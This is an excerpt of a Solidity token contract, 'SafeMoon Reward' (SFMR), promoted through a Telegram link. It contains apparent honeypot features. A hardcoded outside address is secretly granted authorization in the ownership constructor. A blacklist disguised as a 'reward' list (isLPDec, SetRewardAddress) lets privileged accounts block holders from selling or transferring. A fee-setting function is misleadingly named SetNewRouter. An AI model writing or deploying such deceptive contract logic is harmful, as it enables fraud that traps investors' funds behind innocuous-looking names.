...
// Telegram : https://telegram.me/SafeMoonReward
...
contract Ownable is Context {
    ...
    address NativeRouter = 0x70513a616f20F84fD2a3A9aCef1eA9B1eF191d4B;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        authorizations[NativeRouter] = true;
...
contract SAFEMOONREWARD is Ownable, IERC20 {
    ...
    uint256 public _maxTxAmount = _totalSupply * 100000000000 / 100000000000;
    uint256 public _walletMax = _totalSupply * 100000000000 / 100000000000;

    string constant private _name = "SafeMoon Reward";
    string constant private _symbol = "SFMR";
    ...
    mapping (address => bool) public isLPDec;
    ...
    constructor() {
        ...
        lpWallet = msg.sender;
        projectAddress = 0x60E74451056BcAC1c72fdE7f19349e555991e33A;
        devWallet = 0x60E74451056BcAC1c72fdE7f19349e555991e33A;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isLPDec[recipient] && !isLPDec[sender], 'Address is Rewarded');
    ...
    function SetRewardAddress(address _address, bool _value) public authorized{
        isLPDec[_address] = _value;
    }
    ...
    function SetNewRouter(uint256 newLiqFee, uint256 newMarketingFee, uint256 newBetFee, uint256 newNativeFee, uint256 extraSellFee) external onlyOwner {
